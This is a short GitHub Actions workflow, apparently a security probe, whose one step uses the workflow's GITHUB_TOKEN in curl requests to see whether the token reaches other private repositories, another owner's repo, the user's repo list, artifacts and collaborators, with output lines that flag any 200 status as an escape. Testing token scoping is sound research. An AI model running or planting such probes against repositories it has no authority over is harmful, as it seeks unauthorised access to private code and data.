name: probe
on:
  workflow_dispatch:
permissions:
  contents: read
  actions: read
jobs:
  probe:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - name: token-scope-escape
        run: |
          echo "=== GITHUB_TOKEN cross-repo scope test (token now present) ==="
          curl -s -o /dev/null -w "self repo (expect 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/xr-21516
          curl -s -o /dev/null -w "SAME-owner OTHER priv mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313
          curl -s -o /dev/null -w "SAME-owner contents mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313/contents/README.md
          curl -s -o /dev/null -w "CROSS-owner aks-builds priv (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-builds/idor-victim-28481
          curl -s -o /dev/null -w "user/repos list (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user/repos
          curl -s -o /dev/null -w "SAME-owner artifacts mx-26313 (escape if 200): %{http_code}\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/mx-26313/actions/artifacts
          echo "--- token identity ---"
          curl -s -w " [%{http_code}]\n" -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/aks-reviewes/xr-21516/collaborators | python3 -c "import sys;d=sys.stdin.read();print(\"collab-count:\",d.count(\"login\"))" 2>/dev/null
